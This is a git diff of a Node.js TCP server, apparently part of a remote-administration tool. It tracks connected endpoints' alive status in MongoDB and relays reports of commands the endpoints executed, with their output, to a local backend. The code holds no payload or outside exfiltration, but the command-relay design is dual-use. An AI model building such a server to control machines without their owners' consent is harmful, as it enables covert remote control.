@@ -5,7 +5,7 @@ const fs = require ("fs");
 const db = require('../database/config.js');
 // Llistat amb els noms de les colleccions
 const collections = ['client', 'comanda', 'user'];
-const encrypt = require('./crypto/crypto');
+const ciph = require('./crypto/crypto');
 const resp = require('./callback-manager')
 const split = require ("split");
 const fetch = require('node-fetch');
@@ -21,12 +21,25 @@ function startSockets() {
 	const port = 1234;
 	const host = "0.0.0.0";
 	const tout = 3000; //ms para timeout
-	const url = "https://127.0.0.1:5000/outputback";
+	const outputurl = "https://127.0.0.1:5000/outputback";
+	const statusurl = "https://127.0.0.1:5000/status"
 	let sockets = [];
 	let websocket = [];
 	server.listen(port, host, () => {
 		console.log(`TCP server listening on ${host}:${port}`);
+		db.connect( async (err) =>{
+			var cliColl = db.getColl(collections[0])
+			var update = {$set:{"status.alive":false}}
+			await db.updateColl(cliColl,{},update).then((doc) =>{
+				var update = doc
+				console.log(doc)
+			})
+		});
+		ciph.genkeypair()
+		var test = ciph.encrypt("test")
+		ciph.decrypt(test)
 	});
+
 	server.on("connection", (socket) => {
 		var clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
 		console.log(`new client connected: ${clientAddress}`);
@@ -61,6 +74,7 @@ function startSockets() {
 			    		console.log("id 0")
 		    	}else { //cuando el cliente ya tiene idpointer
 		    		socket["id"] = JSON.stringify(pData.head.id)
+
 		    		if (pData.body.message === "Command executed"){
 		    			//console.log(pData)
 		    			var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
@@ -70,7 +84,7 @@ function startSockets() {
 		    				await db.insertDocument(cmdColl, cjstring)
 		    				console.log("input del output de la cmd")
 		    			})
-		    			fetch(url, {
+		    			fetch(outputurl, {
 						  method: 'POST', // or 'PUT'
 						  headers:{
 						    'Content-Type': 'application/json',
@@ -82,6 +96,25 @@ function startSockets() {
 		    		}
 		    		if (sockets.includes(socket)===false){
 		    			sockets.push(socket);
+		    			var alive = {alive:true}
+		    			fetch(statusurl, {
+						  method: 'POST', // or 'PUT'
+						  headers:{
+						    'Content-Type': 'application/json',
+						    'Accept': 'application/json'
+						  },
+						  body: JSON.stringify(outdata), // data can be `string` or {object}!
+						  agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
+						}).catch(error => console.error('Error:', error))
+		    			db.connect( async (err) =>{
+							var cliColl = await db.getColl(collections[0])
+							const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
+							console.log("La id: ", ObjectId)
+							await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:true, lastconnection: new Date()}}}).then((doc) =>{
+								var update = doc
+								console.log(doc)
+							})
+						})
 		    		}
 		    	}
 	    	};
@@ -93,11 +126,11 @@ function startSockets() {
 					return value !== socket;
 				});
 				sockets = filtered
-				console.log(typeof socket["id"])
+				var oID = JSON.parse(socket["id"].trim())
 				db.connect( async (err) =>{
 					var cliColl = await db.getColl(collections[0])
 					//var cliId = db.getPrimaryKey(socket["id"])
-					const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
+					var ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
 					console.log("La id: ", ObjectId)
 					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false, lastconnection: new Date()}}}).then((doc) =>{
 						var update = doc
@@ -117,11 +150,6 @@ function startSockets() {
 };
 exports.startSockets = startSockets;
 //const found = sockets.find(element=> socket) busca un socket al array, retorna objecte
-			//extrae ip y puerto del array de sockets
-	        //const index = sockets.findIndex( (o) => { 
-	        //    return (o.remoteAddress===socket.remoteAddress) && (o.remotePort === socket.remotePort); 
-	        //}); 
-	        //extrae ip y puerto del array de websockets
 //	        const windex = websocket.findeindex( (z) =>{
 //	        	return z.remoteAddress === websocket.remoteAddress) && (z.remotePort === websocket.remotePort)
 //	        })
@@ -129,3 +157,4 @@ exports.startSockets = startSockets;
 			//sockets.forEach((sock) => { 
 			//	sock.write(`${clientAddress} disconnected\n`); 
 			//});
+
